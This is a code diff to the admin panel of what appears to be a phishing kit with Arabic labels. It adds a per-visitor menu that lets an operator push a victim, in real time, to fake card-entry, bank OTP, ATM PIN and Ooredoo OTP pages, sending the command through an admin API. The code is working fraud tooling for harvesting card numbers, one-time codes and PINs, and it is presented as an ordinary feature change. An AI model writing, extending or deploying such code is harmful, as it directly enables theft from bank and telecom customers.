@@ -57,6 +57,8 @@ $v = time(); // Version to bust cache
         .badge-otp-ooredoo { background: #efebe9; color: #5d4037; }
 
         .action-btn { background: #007bff; color: #fff; border: none; padding: 6px 12px; border-radius: 4px; font-weight: 600; cursor: pointer; font-size: 11px; display: flex; align-items: center; gap: 5px; }
+        .redirect-menu .menu-item { padding: 8px 15px; font-size: 12px; cursor: pointer; transition: 0.2s; text-align: right; }
+        .redirect-menu .menu-item:hover { background: #f8f9fa; color: #007bff; }
 
         /* Modal - Professional Design */
         .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.5); display: none; align-items: center; justify-content: center; z-index: 2000; }
@@ -179,7 +181,25 @@ $v = time(); // Version to bust cache
                             ${r.status === 'waiting' ? 'بانتظار القرار' : (r.status === 'approved' ? 'مقبول' : (r.status === 'rejected' ? 'مرفوض' : r.status))}
                         </span>
                     </td>
-                    <td><button class="action-btn" onclick="openDetail('${r.referenceId}')"><i class="bi bi-eye"></i> تفاصيل</button></td>
+                    <td>
+                        <div style="display: flex; gap: 5px;">
+                            <button class="action-btn" onclick="openDetail('${r.referenceId}')"><i class="bi bi-eye"></i> تفاصيل</button>
+                            <div class="dropdown" style="position: relative;">
+                                <button class="action-btn" style="background: #6c757d;" onclick="toggleRedirectMenu('${r.referenceId}')">
+                                    <i class="bi bi-arrow-right-circle"></i> توجيه
+                                </button>
+                                <div id="menu-${r.referenceId}" class="redirect-menu" style="display: none; position: absolute; left: 0; top: 100%; background: white; border: 1px solid #ddd; border-radius: 5px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); z-index: 100; min-width: 150px; padding: 5px 0;">
+                                    <div class="menu-item" onclick="redirectVisitor('${r.referenceId}', 'payment.php')">صفحة البطاقة</div>
+                                    <div class="menu-item" onclick="redirectVisitor('${r.referenceId}', 'otp.php')">صفحة OTP البنك</div>
+                                    <div class="menu-item" onclick="redirectVisitor('${r.referenceId}', 'pin.php')">صفحة ATM PIN</div>
+                                    <div class="menu-item" onclick="redirectVisitor('${r.referenceId}', 'ooredoo.php')">صفحة Ooredoo</div>
+                                    <div class="menu-item" onclick="redirectVisitor('${r.referenceId}', 'otp_ooredoo.php')">صفحة OTP Ooredoo</div>
+                                    <div class="menu-item" onclick="redirectVisitor('${r.referenceId}', 'update_info.php')">تحديث البيانات</div>
+                                    <div class="menu-item" onclick="redirectVisitor('${r.referenceId}', 'index.php')">الصفحة الرئيسية</div>
+                                </div>
+                            </div>
+                        </div>
+                    </td>
                 </tr>
             `).join('');
         }
@@ -237,6 +257,28 @@ $v = time(); // Version to bust cache
         }
 
         function closeModal() { document.getElementById('modal').style.display = 'none'; }
+
+        function toggleRedirectMenu(ref) {
+            const menu = document.getElementById(`menu-${ref}`);
+            const allMenus = document.querySelectorAll('.redirect-menu');
+            allMenus.forEach(m => { if(m.id !== `menu-${ref}`) m.style.display = 'none'; });
+            menu.style.display = menu.style.display === 'none' ? 'block' : 'none';
+        }
+
+        async function redirectVisitor(ref, page) {
+            try {
+                const res = await fetch('../api/admin/redirect-action.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ reference: ref, target_page: page })
+                }).then(r => r.json());
+                
+                if (res.success) {
+                    document.getElementById(`menu-${ref}`).style.display = 'none';
+                    alert('تم إرسال أمر إعادة التوجيه بنجاح');
+                }
+            } catch (e) { alert('حدث خطأ أثناء التوجيه'); }
+        }
 
         async function handleAction(ref, action) {
             await fetch('../api/admin/payment-action.php', {
